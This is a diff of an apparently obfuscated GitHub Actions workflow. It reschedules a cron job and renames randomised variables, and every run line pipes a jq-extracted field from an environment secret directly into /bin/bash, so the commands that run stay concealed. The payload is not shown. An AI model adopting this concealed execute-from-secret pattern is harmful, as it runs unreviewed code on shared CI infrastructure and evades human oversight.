@@ -2,27 +2,21 @@ name: tanloujun7165
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '55 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tanloujun7165
         env:
-          apcsj5321: ${{ secrets.apcsj5321 }}
+          agu0869: ${{ secrets.agu0869 }}
         run: |
-          echo $apcsj5321 | jq -r .io9 | /bin/bash
-          echo $wop991 | jq -r .khtaa4 | /bin/bash
-          echo $rd398 | jq -r .hjt9 | /bin/bash
-          echo $swyt2 | jq -r .vizs2 | /bin/bash
-          echo $jg8 | jq -r .uygum14032 | /bin/bash
-          echo $j86620 | jq -r .ia826 | /bin/bash
-          echo $p143 | jq -r .xdbih12615 | /bin/bash
-          echo $r6978 | jq -r .mc54 | /bin/bash
-          echo $cpa1973 | jq -r .t6 | /bin/bash
-          echo $gqlzd81 | jq -r .xed280 | /bin/bash
-          echo $i10 | jq -r .w77317 | /bin/bash
+          echo $agu0869 | jq -r .p28566 | /bin/bash
+          echo $k539 | jq -r .pdj6271 | /bin/bash
+          echo $y17 | jq -r .oiab0 | /bin/bash
+          echo $bbt996 | jq -r .ux0897 | /bin/bash
+          echo $rgew7626 | jq -r .k8624 | /bin/bash
+          echo $kqh9 | jq -r .xng6748 | /bin/bash
 
